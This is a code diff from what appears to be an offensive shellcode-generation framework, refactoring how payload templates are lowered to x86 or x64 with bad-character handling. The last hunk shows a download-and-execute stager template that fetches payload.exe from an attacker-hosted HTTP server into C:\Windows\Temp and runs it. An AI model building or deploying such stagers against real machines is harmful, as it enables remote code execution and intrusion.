@@ -21,10 +21,12 @@ from __future__ import annotations
 import socket as _socket
 import struct as _struct
 from collections.abc import Callable
+from typing import cast
 
 from ..arch import Arch
 from ..payload_templates.base import PayloadTemplate, TemplateConfig
 from ..stack_alloc import StackLayout
+from ..stack_alloc_x64 import StackLayoutX64
 from .ir import (
     AddressOf,
     AllocateLocal,
@@ -48,8 +50,8 @@ from .ir import (
     ZeroStruct,
 )
 from .validator import validate
-from .x86_backend import lower_workflow
 from .x64_backend import lower_workflow_x64
+from .x86_backend import lower_workflow
 
 # GetCurrentProcess() returns the pseudo-handle (HANDLE)-1 = 0xFFFFFFFF.
 # We use the well-known constant directly to avoid an extra API resolution.
@@ -149,12 +151,16 @@ class WorkflowTemplate(PayloadTemplate):
         """
         return self._workflow
 
-    def emit(self, layout, config: TemplateConfig) -> str:
-        from ..stack_alloc_x64 import StackLayoutX64
+    def emit(self, layout: StackLayout | StackLayoutX64, config: TemplateConfig) -> str:
+        """Lower against the selected target's physical stack layout."""
         workflow = self._resolve_workflow(config)
-        if isinstance(layout, StackLayoutX64):
-            return lower_workflow_x64(workflow, layout, config.badchars, config)
-        return lower_workflow(workflow, layout, config.badchars, config)
+        if config.effective_target.arch is Arch.X64:
+            # RecordingLayoutX64 shares the lowering layout protocol but is not
+            # a StackLayoutX64 subclass; it is used during requirement probing.
+            return lower_workflow_x64(
+                workflow, cast(StackLayoutX64, layout), config.badchars, config,
+            )
+        return lower_workflow(workflow, cast(StackLayout, layout), config.badchars, config)
 
     def _extract_slots(self, workflow: Workflow) -> list[str]:
         """Extract all slot names from a workflow's IR operations."""
@@ -1272,7 +1278,7 @@ class IRHttpDownloadTemplate(WorkflowTemplate):
         url = config.url or "http://192.168.1.10/payload.exe"
         dst = config.dst_path or r"C:\Windows\Temp\payload.exe"
         return [
-            ("Start HTTP server", f"python3 -m http.server 80 --directory /path/to/payloads"),
+            ("Start HTTP server", "python3 -m http.server 80 --directory /path/to/payloads"),
             ("Download URL", url),
             ("Writes to", dst),
             ("Executes after download", dst),
